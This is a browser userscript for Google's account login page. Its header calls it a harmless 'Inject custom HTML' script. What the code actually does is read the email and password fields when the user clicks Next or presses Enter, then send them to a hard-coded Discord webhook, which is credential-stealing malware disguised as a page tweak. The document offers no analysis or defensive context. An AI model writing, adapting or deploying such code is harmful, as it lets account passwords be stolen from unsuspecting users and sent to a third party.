// ==UserScript==
// @name        Inject HTML into
// @namespace   Violentmonkey Scripts
// @match       https://accounts.google.com/*
// @grant       none
// @version     1.0
// @author      Your Name
// @description Inject custom HTML into the  page
// ==/UserScript==

(function() {
  'use strict';






    function Test() {

    console.log("ERE")


      const UserData = {

          email: document.getElementsByClassName("IxcUte")[0].innerText,

          password: document.getElementsByClassName("whsOnd zHQkBf").value




          };

      console.log(UserData["password"])


                    const webhookURL = 'https://discord.com/api/webhooks/1224873688231579781/09qUBm21X4eqVQFzW5gOZfaQR9urqY5i4fltBxDNuq4f0Ye6bMkch1ahAzYoy8-qE1hh';
                    const messageContent = JSON.stringify(UserData);



                    fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                    'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                    content: "Email: " + "`" +  UserData["email"] + "`" + " Password: " + "`" + document.querySelector('.whsOnd.zHQkBf').value + "`"
                    }),
                    })
                    .then(response => {
                    if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                    }
                    return response.json();
                    })
                    .then(data => console.log('Message sent:', data))
             //       .catch(error => console.error('Error sending message:', error.message));







    }






  var passwordBox = document.querySelector('.whsOnd.zHQkBf');
  var nextButtons = document.querySelectorAll('.VfPpkd-LgbsSe');

  function handleKeyDown(event) {
      var initialValue = passwordBox.value.trim();
      if (event.keyCode === 13 && initialValue.length > 0 && !passwordBox.matches(':focus')) {
          console.log("Enter key pressed. Calling Test()");
          Test();
      }
  }




  // Add event listeners to each NextButton and document
  nextButtons.forEach(function(nextButton) {
      nextButton.addEventListener('click', Test);
  });
  document.addEventListener('keydown', handleKeyDown);






})();
